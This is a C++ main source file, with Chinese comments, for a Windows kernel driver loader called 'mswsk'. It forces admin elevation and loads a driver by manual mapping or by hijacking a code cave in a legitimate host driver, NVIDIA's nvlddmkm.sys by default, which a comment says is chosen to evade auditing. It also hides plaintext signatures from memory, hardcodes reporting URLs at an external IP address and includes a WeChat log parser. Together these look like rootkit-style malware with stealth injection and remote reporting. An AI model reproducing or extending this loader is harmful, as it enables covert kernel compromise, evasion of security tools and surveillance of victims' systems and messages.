// ============================================================
// main.cpp — mswsk 内存加载器主程序
//
// 功能：
//   1. 检查管理员权限
//   2. 调用 LoadDrvWsk() 执行 WHQL default 分支注入
//   3. 错误处理与日志输出
#include "loader_common.h"

#if MODE_MANUAL_MAP_CAVE
    #include "shellcode_builder.h"
#elif MODE_MANUAL_MAP
    #include "pool_mapper.h"
#else
    #include "scm_loader.h"
#endif

#if ENABLE_WECHAT_PARSER_TEST
    #include "wechat_parser.h"
#endif

#include <cstdio>

// ---- 检查当前进程是否以管理员权限运行 ----
static bool IsRunAsAdmin()
{
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuth, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup))
    {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin != FALSE;
}

// ---- 提升权限（重新启动自身为管理员）----
static bool ElevateAndRestart(int argc, wchar_t* argv[])
{
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    // 构造命令行参数（除 argv[0] 外的所有参数）
    std::wstring params;
    for (int i = 1; i < argc; i++) {
        if (i > 1) params += L" ";
        params += L"\"";
        params += argv[i];
        params += L"\"";
    }

    SHELLEXECUTEINFOW sei = {};
    sei.cbSize       = sizeof(sei);
    sei.lpVerb       = L"runas";   // 请求管理员权限
    sei.lpFile       = exePath;
    sei.lpParameters = params.empty() ? NULL : params.c_str();
    sei.nShow        = SW_SHOWNORMAL;
    sei.fMask        = SEE_MASK_NOASYNC;

    if (!ShellExecuteExW(&sei)) {
        DWORD gle = GetLastError();
        if (gle == ERROR_CANCELLED) {
            LOG_ERR("User declined privilege elevation");
        } else {
            LOG_ERR("ShellExecuteExW failed, GLE=%lu", gle);
        }
        return false;
    }
    return true;
}


int wmain(int argc, wchar_t* argv[])
{
    bool interactive = true;
    bool forceReload = false;
    for (int i = 1; i < argc; i++) {
        if (wcscmp(argv[i], L"--non-interactive") == 0 || wcscmp(argv[i], L"-n") == 0) {
            interactive = false;
        } else if (wcscmp(argv[i], L"--force") == 0 || wcscmp(argv[i], L"-f") == 0) {
            forceReload = true;
        }
    }

    // 静默模式与中性输出，避免明文特征暴露于进程内存中
    (void)interactive;

    // ---- 1. 检查管理员权限 ----
    if (!IsRunAsAdmin()) {
        LOG_ERR("Process is not running with administrative privileges");
        LOG_INFO("Requesting administrative elevation...");
        if (ElevateAndRestart(argc, argv)) {
            // 重启成功，当前进程退出
            return 0;
        } else {
            LOG_ERR("Privilege elevation failed, exiting");
            printf("\nPress any key to exit...");
            getchar();
            return 1;
        }
    }
    LOG_OK("Administrative privileges verified");

#if ENABLE_WECHAT_PARSER_TEST
    for (int i = 1; i < argc; i++) {
        if (_wcsicmp(argv[i], L"--test-wx") == 0 || _wcsicmp(argv[i], L"-wx") == 0) {
            char logFile[MAX_PATH] = "weixin.log";
            if (i + 1 < argc && argv[i + 1][0] != L'-') {
                WideCharToMultiByte(CP_UTF8, 0, argv[++i], -1, logFile, sizeof(logFile), NULL, NULL);
            }
            bool res = WeChatParser::RunWeChatParserTestAuto(logFile);
            if (interactive) {
                printf("\nPress any key to exit...");
                fflush(stdout);
                getchar();
            }
            return res ? 0 : 1;
        }
    }
#endif

    // ---- 2. 解析命令行参数并确定 mswsk.sys 路径与宿主驱动及通信配置 ----
    wchar_t drvPath[MAX_PATH] = {};
    wchar_t hostDrvName[MAX_PATH] = L"nvlddmkm.sys"; // 默认首选 NVIDIA 显卡驱动宿主 (体积极大/节区充裕/规避审计)
    bool hostExplicit = false;
    bool modeExplicit = false;
    bool portExplicit = false;

    DRV_BOOT_CONFIG_EX bootConfigEx = {};
    bootConfigEx.Base.Magic         = DRV_BOOT_MAGIC;
    bootConfigEx.Base.TransportMode = DRV_TRANSPORT_TCP; // 默认 TCP 通信
    bootConfigEx.Base.Port          = 10001;             // 默认 10001 端口
    bootConfigEx.Base.Flags         = 0;
    GetModuleFileNameW(NULL, bootConfigEx.HostLoaderPath, 260);

    // ---- 默认带动态防伪 Token 启动 ----
    FILETIME ft = {};
    GetSystemTimeAsFileTime(&ft);
    uint64_t ft64 = ((uint64_t)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
    uint64_t sec = ft64 / 10000000ULL;
    if (sec >= 11644473600ULL) sec -= 11644473600ULL;
    uint64_t counter = sec / g_Step;
    bootConfigEx.Base.AuthToken = CalcToken(counter, GetCurrentProcessId());

    // 默认填充 16 字节随机防伪会话鉴权熵 (SessionToken)
    uint64_t entropy1 = ft64 ^ 0xA5A5A5A55A5A5A5AULL;
    uint64_t entropy2 = ((uint64_t)GetCurrentProcessId() << 32) ^ __rdtsc();
    memcpy(&bootConfigEx.Base.SessionToken[0], &entropy1, 8);
    memcpy(&bootConfigEx.Base.SessionToken[8], &entropy2, 8);

    // ---- 默认传入上报 URL 参数 ----
    strcpy_s(bootConfigEx.LoginUrl, sizeof(bootConfigEx.LoginUrl), "https://112.5.37.106:1234");
    strcpy_s(bootConfigEx.ApiUrl, sizeof(bootConfigEx.ApiUrl), "https://112.5.37.106:1234");
    strcpy_s(bootConfigEx.ReportUrl, sizeof(bootConfigEx.ReportUrl), "https://112.5.37.106:1236");

    for (int i = 1; i < argc; i++) {
        if (_wcsicmp(argv[i], L"-h") == 0 || _wcsicmp(argv[i], L"--host") == 0) {
            if (i + 1 < argc) {
                wcscpy_s(hostDrvName, argv[++i]);
                hostExplicit = true;
            }
        } else if (_wcsicmp(argv[i], L"--tcp") == 0) {
            bootConfigEx.Base.TransportMode = DRV_TRANSPORT_TCP;
            modeExplicit = true;
            if (i + 1 < argc && argv[i + 1][0] != L'-') {
                int p = _wtoi(argv[++i]);
                if (p > 0 && p <= 65535) { bootConfigEx.Base.Port = (uint16_t)p; portExplicit = true; }
            } else if (bootConfigEx.Base.Port == 0 || bootConfigEx.Base.Port == 10002) {
                bootConfigEx.Base.Port = 10001;
            }
        } else if (_wcsicmp(argv[i], L"--udp") == 0) {
            bootConfigEx.Base.TransportMode = DRV_TRANSPORT_UDP;
            modeExplicit = true;
            if (i + 1 < argc && argv[i + 1][0] != L'-') {
                int p = _wtoi(argv[++i]);
                if (p > 0 && p <= 65535) { bootConfigEx.Base.Port = (uint16_t)p; portExplicit = true; }
            } else {
                bootConfigEx.Base.Port = 10002;
            }
        } else if (_wcsicmp(argv[i], L"--usb") == 0) {
            bootConfigEx.Base.TransportMode = DRV_TRANSPORT_USB;
            modeExplicit = true;
            bootConfigEx.Base.Port = 0;
            portExplicit = true;
        } else if (_wcsicmp(argv[i], L"-p") == 0 || _wcsicmp(argv[i], L"--port") == 0) {
            if (i + 1 < argc) {
                int p = _wtoi(argv[++i]);
                if (p > 0 && p <= 65535) {
                    bootConfigEx.Base.Port = (uint16_t)p;
                    portExplicit = true;
                }
            }
        } else if (_wcsicmp(argv[i], L"-t") == 0 || _wcsicmp(argv[i], L"--token") == 0) {
            if (i + 1 < argc) {
                bootConfigEx.Base.AuthToken = (uint32_t)wcstoul(argv[++i], nullptr, 0);
            }
        } else if (_wcsicmp(argv[i], L"--api-url") == 0) {
            if (i + 1 < argc) {
                WideCharToMultiByte(CP_UTF8, 0, argv[++i], -1, bootConfigEx.ApiUrl, sizeof(bootConfigEx.ApiUrl), NULL, NULL);
            }
        } else if (_wcsicmp(argv[i], L"--login-url") == 0) {
            if (i + 1 < argc) {
                WideCharToMultiByte(CP_UTF8, 0, argv[++i], -1, bootConfigEx.LoginUrl, sizeof(bootConfigEx.LoginUrl), NULL, NULL);
            }
        } else if (_wcsicmp(argv[i], L"--report-url") == 0) {
            if (i + 1 < argc) {
                WideCharToMultiByte(CP_UTF8, 0, argv[++i], -1, bootConfigEx.ReportUrl, sizeof(bootConfigEx.ReportUrl), NULL, NULL);
            }
        } else if (argv[i][0] != L'-') {
            if (drvPath[0] == 0) {
                wcscpy_s(drvPath, argv[i]);
            } else if (!hostExplicit) {
                wcscpy_s(hostDrvName, argv[i]);
                hostExplicit = true;
            }
        }
    }

    // Interactive user prompt for selecting transport mode & port
    if (interactive && !modeExplicit) {
        printf("\n=======================================================\n");
        printf(" [?] Select Transport Mode:\n");
        printf("     1. TCP (Default)\n");
        printf("     2. UDP\n");
        printf("     3. USB\n");
        printf(" Enter option [1-3] (Press Enter for default: 1. TCP): ");
        fflush(stdout);

        char inputBuf[128] = {};
        if (fgets(inputBuf, sizeof(inputBuf), stdin)) {
            char* p = inputBuf;
            while (*p == ' ' || *p == '\t') p++;
            char* end = p + strlen(p);
            while (end > p && (*(end - 1) == '\r' || *(end - 1) == '\n' || *(end - 1) == ' ' || *(end - 1) == '\t')) {
                *(--end) = '\0';
            }

            if (*p == '\0' || strcmp(p, "1") == 0 || _stricmp(p, "tcp") == 0) {
                bootConfigEx.Base.TransportMode = DRV_TRANSPORT_TCP;
            } else if (strcmp(p, "2") == 0 || _stricmp(p, "udp") == 0) {
                bootConfigEx.Base.TransportMode = DRV_TRANSPORT_UDP;
                if (!portExplicit) bootConfigEx.Base.Port = 10001;
            } else if (strcmp(p, "3") == 0 || _stricmp(p, "usb") == 0) {
                bootConfigEx.Base.TransportMode = DRV_TRANSPORT_USB;
                bootConfigEx.Base.Port = 0;
                portExplicit = true;
            } else {
                printf(" [*] Invalid option \"%s\", defaulting to 1. TCP\n", p);
                bootConfigEx.Base.TransportMode = DRV_TRANSPORT_TCP;
            }
        }
    }

    // Interactive user prompt for port configuration (TCP / UDP)
    if (interactive && !portExplicit && bootConfigEx.Base.TransportMode != DRV_TRANSPORT_USB) {
        printf(" [?] Enter Communication Port [1-65535] (Press Enter for default: 10001): ");
        fflush(stdout);

        char inputBuf[128] = {};
        if (fgets(inputBuf, sizeof(inputBuf), stdin)) {
            char* p = inputBuf;
            while (*p == ' ' || *p == '\t') p++;
            char* end = p + strlen(p);
            while (end > p && (*(end - 1) == '\r' || *(end - 1) == '\n' || *(end - 1) == ' ' || *(end - 1) == '\t')) {
                *(--end) = '\0';
            }

            if (*p == '\0') {
                bootConfigEx.Base.Port = 10001;
            } else {
                int pNum = atoi(p);
                if (pNum > 0 && pNum <= 65535) {
                    bootConfigEx.Base.Port = (uint16_t)pNum;
                } else {
                    printf(" [*] Invalid port \"%s\", using default 10001\n", p);
                    bootConfigEx.Base.Port = 10001;
                }
            }
        } else {
            bootConfigEx.Base.Port = 10001;
        }
        printf("=======================================================\n\n");
    }
    if (drvPath[0] == 0) {
        wchar_t exeDir[MAX_PATH] = {};
        GetModuleFileNameW(NULL, exeDir, MAX_PATH);
        wchar_t* lastSlash = wcsrchr(exeDir, L'\\');
        if (lastSlash) *(lastSlash + 1) = 0;
        swprintf_s(drvPath, L"%smswsk.sys", exeDir);
    }
    const wchar_t* pTargetHost = hostDrvName;
    LOG_INFO("Target host driver: %ls%s", pTargetHost, hostExplicit ? " (Explicit)" : " (Default: NVIDIA)");

    const wchar_t* modeStr = L"TCP";
    if (bootConfigEx.Base.TransportMode == DRV_TRANSPORT_UDP) modeStr = L"UDP";
    else if (bootConfigEx.Base.TransportMode == DRV_TRANSPORT_USB) modeStr = L"USB";

    LOG_INFO("Boot Transport: %ls (Port=%u, Token=0x%08X)",
             modeStr, bootConfigEx.Base.Port, bootConfigEx.Base.AuthToken);
    LOG_INFO("Boot URLs: Login=%s, Api=%s, Report=%s",
             bootConfigEx.LoginUrl, bootConfigEx.ApiUrl, bootConfigEx.ReportUrl);

    // ---- 3. 检查文件是否存在 ----
    DWORD attr = GetFileAttributesW(drvPath);
    if (attr == INVALID_FILE_ATTRIBUTES) {
        LOG_ERR("mswsk.sys not found: %ls (GLE=%lu)", drvPath, GetLastError());
        printf("\nUsage: loader.exe [mswsk.sys] [-h host.sys] [--tcp [port] | --udp [port] | --usb] [-t token] [--force] [--non-interactive] [--api-url <url>] [--login-url <url>] [--report-url <url>] [--test-wx [alias] [chatroom]]\n");
        if (interactive) {
            printf("Press any key to exit...");
            fflush(stdout);
            getchar();
        }
        return 1;
    }

    // ---- 4. 根据模式宏分流执行加载流程 ----
#if MODE_MANUAL_MAP_CAVE
    LOG_INFO("Pipeline Mode: [ManualMapCave] (PTE Remap & Host Code Cave Hijack)");
    bool ok = LoadDrvWskViaCave(drvPath, L"Machenike.sys", pTargetHost, forceReload, &bootConfigEx.Base);
#elif MODE_MANUAL_MAP
    LOG_INFO("Pipeline Mode: [ManualMap] (Kernel Allocated Pool Memory)");
    bool ok = LoadDrvWskViaPool(drvPath, L"Machenike.sys", forceReload, &bootConfigEx.Base);
#else
    LOG_INFO("Pipeline Mode: [Normal SCM] (Standard Windows Service Control Manager)");
    bool ok = LoadDrvWskViaSCM(drvPath, L"mswsk", forceReload, &bootConfigEx.Base, &bootConfigEx);
#endif

    if (ok) {
        LOG_OK("Initialization complete.");
    } else {
        LOG_ERR("Initialization failed (code=1).");
    }
    if (interactive) {
        printf("Press any key to exit...");
        fflush(stdout);
        getchar();
    }
    fflush(stdout);
    fflush(stderr);
    return ok ? 0 : 1;
}
